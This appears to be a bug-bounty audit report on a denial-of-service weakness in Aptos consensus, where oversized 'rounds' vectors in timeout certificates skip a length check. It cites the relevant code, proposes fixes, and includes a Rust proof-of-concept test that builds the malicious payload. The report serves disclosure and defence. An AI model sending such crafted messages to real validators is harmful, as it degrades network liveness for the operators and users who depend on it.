# Audit Report

## Title
Resource Exhaustion via Oversized `rounds` Vector in `TwoChainTimeoutCertificate`

## Summary
An attacker can send SyncInfo messages containing a `TwoChainTimeoutCertificate` with an extremely large `rounds` vector that bypasses size validation during deserialization, causing memory allocation and CPU exhaustion during verification.

## Finding Description

The `AggregateSignatureWithRounds` struct in `TwoChainTimeoutCertificate` contains two fields: an `AggregateSignature` with a BitVec indicating N validators, and a `Vec<Round>` that should contain exactly N elements. While the constructor enforces this invariant with an assertion, the struct derives `Deserialize`, allowing BCS deserialization to bypass this validation. [1](#0-0) 

An attacker can craft a malicious `TwoChainTimeoutCertificate` where:
- The `AggregateSignature` has a valid BitVec with N bits set (matching the validator set size)
- The `rounds` vector contains M elements where M >> N (e.g., 1 million elements = 8 MB)

This malicious structure passes network deserialization because:
1. The message size is within the 64 MiB network limit [2](#0-1) 
2. BCS deserialization doesn't invoke the constructor's `assert_eq!` check
3. BitVec validation only checks against validator set size, not against the rounds vector length

During verification, two resource-intensive operations occur:

**Operation 1:** The `get_voters_and_rounds()` function clones the entire oversized rounds vector: [3](#0-2) 

**Operation 2:** The verify function iterates through all elements in the rounds vector to find the maximum: [4](#0-3) 

These operations are called from `TwoChainTimeoutCertificate::verify()`, which is invoked during SyncInfo message processing: [5](#0-4) 

The verification happens in the message processing path before any size validation, allowing an attacker to repeatedly trigger expensive operations by sending crafted SyncInfo messages.

## Impact Explanation

This is a **Medium Severity** vulnerability under the Aptos Bug Bounty criteria, specifically "Validator node slowdowns". An attacker can:

1. **Memory Exhaustion**: Each malicious message causes an 8 MB allocation (for 1M rounds) when `self.rounds.clone()` is executed
2. **CPU Exhaustion**: The `iter().max()` operation processes all 1 million elements (O(M) complexity)
3. **Repeated Attack**: Multiple messages amplify the impact, as each triggers verification
4. **Network-Wide Impact**: Affects all validators processing the malicious SyncInfo messages

While this doesn't directly steal funds or break consensus safety, it can significantly degrade validator performance and potentially cause nodes to fall behind, impacting network liveness.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No special permissions required (any network peer can send consensus messages)
- Easy to craft (standard BCS serialization with modified field lengths)
- No cryptographic operations needed (the signature verification fails, but only after resource exhaustion)
- Can be automated and repeated to amplify impact

The vulnerability is triggered every time a node receives and attempts to verify a SyncInfo message containing the malicious `TwoChainTimeoutCertificate`.

## Recommendation

Add explicit validation in `AggregateSignatureWithRounds` deserialization to ensure the rounds vector length matches the number of voters. Implement a custom `Deserialize` implementation:

```rust
impl<'de> Deserialize<'de> for AggregateSignatureWithRounds {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        struct AggregateSignatureWithRoundsHelper {
            sig: AggregateSignature,
            rounds: Vec<Round>,
        }
        
        let helper = AggregateSignatureWithRoundsHelper::deserialize(deserializer)?;
        
        if helper.sig.get_num_voters() != helper.rounds.len() {
            return Err(serde::de::Error::custom(format!(
                "Rounds vector length {} does not match number of voters {}",
                helper.rounds.len(),
                helper.sig.get_num_voters()
            )));
        }
        
        Ok(Self {
            sig: helper.sig,
            rounds: helper.rounds,
        })
    }
}
```

Alternatively, perform early validation in the `TwoChainTimeoutCertificate::verify()` method before expensive operations:

```rust
pub fn verify(&self, validators: &ValidatorVerifier) -> anyhow::Result<()> {
    // Early validation to prevent DoS
    ensure!(
        self.signatures_with_rounds.sig().get_num_voters() 
            == self.signatures_with_rounds.rounds().len(),
        "Rounds vector size mismatch: expected {}, got {}",
        self.signatures_with_rounds.sig().get_num_voters(),
        self.signatures_with_rounds.rounds().len()
    );
    
    // ... rest of verification
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod dos_test {
    use super::*;
    use aptos_crypto::bls12381;
    use aptos_types::{aggregate_signature::AggregateSignature, validator_verifier::random_validator_verifier};
    use aptos_bitvec::BitVec;
    
    #[test]
    fn test_oversized_rounds_vector_dos() {
        // Setup validator verifier with 4 validators
        let (signers, validators) = random_validator_verifier(4, None, false);
        
        // Create a valid QuorumCert for the timeout
        let vote_data = VoteData::new(BlockInfo::random(1), BlockInfo::random(0));
        let qc = QuorumCert::dummy();
        
        // Create timeout with valid HQC
        let timeout = TwoChainTimeout::new(1, 10, qc);
        
        // Craft malicious AggregateSignatureWithRounds
        // BitVec indicates 3 voters (valid)
        let mut bitvec = BitVec::with_num_bits(4);
        bitvec.set(0);
        bitvec.set(1);
        bitvec.set(2);
        
        let sig = AggregateSignature::new(bitvec, None);
        
        // But rounds vector has 1 million elements (DoS vector)
        let malicious_rounds: Vec<u64> = vec![1; 1_000_000];
        
        // Manually construct the struct via BCS to bypass constructor validation
        #[derive(Serialize)]
        struct MaliciousAggSig {
            sig: AggregateSignature,
            rounds: Vec<u64>,
        }
        
        let malicious = MaliciousAggSig {
            sig: sig.clone(),
            rounds: malicious_rounds,
        };
        
        // Serialize and deserialize to simulate network reception
        let bytes = bcs::to_bytes(&malicious).unwrap();
        println!("Malicious message size: {} bytes", bytes.len());
        
        // This succeeds because Deserialize doesn't validate
        let deserialized: AggregateSignatureWithRounds = 
            bcs::from_bytes(&bytes).unwrap();
        
        // Verify the DoS condition
        assert_eq!(deserialized.sig().get_num_voters(), 3);
        assert_eq!(deserialized.rounds().len(), 1_000_000);
        
        // Create the malicious TwoChainTimeoutCertificate
        let malicious_tc = TwoChainTimeoutCertificate {
            timeout,
            signatures_with_rounds: deserialized,
        };
        
        // Measure resource consumption during verify
        use std::time::Instant;
        let start = Instant::now();
        
        // This will allocate 8 MB and iterate 1M times
        let _ = malicious_tc.verify(&validators);
        
        let duration = start.elapsed();
        println!("Verification took: {:?}", duration);
        println!("This demonstrates the DoS vulnerability");
    }
}
```

**Notes**

This vulnerability breaks the Resource Limits invariant by allowing unbounded memory allocation and CPU consumption during message verification. The fix should be deployed as a priority patch to prevent potential network degradation attacks. The vulnerability exists because the deserialization path bypasses the constructor's validation, a common pattern issue when deriving `Deserialize` on structs with cross-field invariants.

### Citations

**File:** consensus/consensus-types/src/timeout_2chain.rs (L170-175)
```rust
        let signed_hqc = self
            .signatures_with_rounds
            .rounds()
            .iter()
            .max()
            .ok_or_else(|| anyhow::anyhow!("Empty rounds"))?;
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L354-364)
```rust
pub struct AggregateSignatureWithRounds {
    sig: AggregateSignature,
    rounds: Vec<Round>,
}

impl AggregateSignatureWithRounds {
    pub fn new(sig: AggregateSignature, rounds: Vec<Round>) -> Self {
        assert_eq!(sig.get_num_voters(), rounds.len());
        Self { sig, rounds }
    }

```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L380-389)
```rust
        &self,
        ordered_validator_addresses: &[AccountAddress],
    ) -> Vec<(AccountAddress, Round)> {
        self.sig
            .get_signers_addresses(ordered_validator_addresses)
            .into_iter()
            .zip(self.rounds.clone())
            .collect()
    }

```

**File:** config/src/config/network_config.rs (L50-50)
```rust
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```

**File:** consensus/src/round_manager.rs (L878-896)
```rust
    async fn sync_up(&mut self, sync_info: &SyncInfo, author: Author) -> anyhow::Result<()> {
        let local_sync_info = self.block_store.sync_info();
        if sync_info.has_newer_certificates(&local_sync_info) {
            info!(
                self.new_log(LogEvent::ReceiveNewCertificate)
                    .remote_peer(author),
                "Local state {},\n remote state {}", local_sync_info, sync_info
            );
            // Some information in SyncInfo is ahead of what we have locally.
            // First verify the SyncInfo (didn't verify it in the yet).
            sync_info.verify(&self.epoch_state.verifier).map_err(|e| {
                error!(
                    SecurityEvent::InvalidSyncInfoMsg,
                    sync_info = sync_info,
                    remote_peer = author,
                    error = ?e,
                );
                VerifyError::from(e)
            })?;
```
